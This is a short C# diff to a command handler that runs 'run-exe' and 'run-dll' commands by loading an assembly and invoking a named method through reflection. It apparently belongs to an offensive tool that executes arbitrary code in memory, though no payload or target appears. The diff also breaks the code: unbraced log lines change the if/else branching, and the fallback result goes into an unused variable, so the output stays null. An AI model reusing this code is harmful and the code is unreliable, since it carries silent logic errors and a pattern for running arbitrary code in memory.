@@ -232,7 +232,7 @@ public class Program
 		var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
 		int i = 0;
 		string sOut = null;
-		string method = "", splittheseargs = "", qualifiedname = "", name = "";
+		string sMethod = "", splittheseargs = "", qualifiedname = "", name = "";
 		foreach (var a in splitargs)
 		{
 			if (i == 1)
@@ -241,11 +241,13 @@ public class Program
 				name = a;
 
 			if (c.ToLower().StartsWith("run-exe"))
+			  Console.WriteLine("[+] Executing run-exe");
 				if (i > 2)
 					splittheseargs = splittheseargs + " " + a;
 			else
+			  Console.WriteLine("[+] Executing run-dll");
 				if (i == 3)
-					method = a;
+					sMethod = a;
 				else if (i > 3)
 					splittheseargs = splittheseargs + " " + a;
 			i++;
@@ -264,11 +266,11 @@ public class Program
 					{
 						try
 						{
-							sOut = loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] { splitnewargs }).ToString();
+							sOut = loadedType.Assembly.GetType(qualifiedname).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] { splitnewargs }).ToString();
 						}
 						catch
 						{
-							sOut = loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString();
+							var asOut = loadedType.Assembly.GetType(qualifiedname).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString();
 						}
 					}
 				}
